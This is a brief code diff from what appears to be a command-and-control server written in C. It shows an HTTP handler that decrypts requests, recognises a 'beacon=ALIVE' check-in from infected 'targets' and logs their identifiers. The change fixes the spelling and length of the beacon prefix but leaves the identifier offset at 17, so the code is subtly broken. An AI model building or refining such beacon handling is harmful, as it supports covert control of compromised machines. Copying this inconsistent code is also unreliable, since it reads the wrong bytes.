@@ -332,7 +332,7 @@ DWORD WINAPI handle_http_connections(LPVOID arg) {
             printf("out:\n%s\n", buffer);
             
             char* reply;
-            if (strncmp((char*)decrypted, "GET /becon=ALIVE:", 17) == 0) {
+            if (strncmp((char*)decrypted, "GET /beacon=ALIVE:", 18) == 0) {
                 char *hex = bytes_to_hex(&decrypted[17], 8);
                 printf("TRAGET %s CONECTED\n", hex);
                 memset(buffer, 0, sizeof(buffer));
